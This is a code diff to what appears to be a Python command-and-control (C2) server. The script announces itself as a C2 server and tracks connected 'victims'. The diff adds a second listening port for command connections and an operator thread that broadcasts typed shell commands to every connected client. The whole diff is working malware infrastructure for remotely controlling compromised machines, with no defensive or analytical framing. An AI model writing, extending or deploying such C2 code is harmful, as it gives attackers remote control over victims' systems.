@@ -8,6 +8,7 @@ import enum
 
 HOST = "127.0.0.1"
 PORT = 4444
+COMMANDS_PORT = 4445
 CLIENT_HANDLER_THREADS = list()
 CLIENT_SOCKETS = list()
 
@@ -99,11 +100,33 @@ def execute_command(command: str):
     for client in CLIENT_SOCKETS:
         client.send(command.encode())
 
-def instruction_handler():
+def command_handler_thread():
     user_input = input("Enter command to execute on clients: ")
     while user_input.lower() != "exit":
         execute_command(user_input)
         user_input = input("Enter command to execute on clients: ")
+
+def instruction_handler():
+    command_handler = threading.Thread(target=command_handler_thread)
+    command_handler.start()
+
+    command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    command_socket.bind((HOST, COMMANDS_PORT))
+    command_socket.listen(5)
+
+    global CLIENT_SOCKETS
+
+    try:
+        while True:
+            client_socket_command, addr_command = command_socket.accept()
+            print("Command connection from:" , addr_command)
+            CLIENT_SOCKETS.append(client_socket_command)
+
+    except Exception as e:
+        print("Exception on command handler: " + str(e))
+    finally:
+        command_socket.close()
+
 
 def main():
     print("Starting C2 server...")
@@ -120,7 +143,6 @@ def main():
     server_socket.listen(5)
 
     global CLIENT_HANDLER_THREADS
-    global CLIENT_SOCKETS
     print(f"Server listening on {HOST}:{PORT}")
 
     try:
@@ -131,7 +153,6 @@ def main():
             CLIENT_HANDLER_THREADS.append(threading.Thread(target=handle_client, args=(client_socket,key, salt)))
             CLIENT_HANDLER_THREADS[-1].start()
             VICTIM_CORRECT_ANSWERS_COUNTER[addr] = 0
-            CLIENT_SOCKETS.append(client_socket)
     
     except Exception as e:
         print("Exception: " + str(e))
